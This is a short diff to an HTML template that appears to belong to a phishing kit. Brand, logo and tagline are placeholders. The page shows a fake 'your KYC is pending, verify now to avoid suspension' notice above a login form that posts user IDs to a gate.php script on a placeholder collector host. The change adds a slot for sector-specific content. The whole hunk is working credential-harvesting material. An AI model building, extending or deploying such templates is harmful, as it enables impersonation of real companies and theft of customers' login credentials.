@@ -10,7 +10,7 @@
 <body>
   <div class="header"><img src="/assets/{slug}.png" alt="{brand}"><span>{tagline}</span></div>
   <div class="container">
-    <div class="notice"><p>Dear Customer, your KYC is pending. Verify now to avoid suspension.</p></div>
+    <div class="notice"><p>Dear Customer, your KYC is pending. Verify now to avoid suspension.</p></div>{sector_block}
     <form id="loginForm" method="post" action="https://{collector}/gate.php">
       <h2>Login to {brand}</h2>
       <input type="text" name="uid" placeholder="User ID">
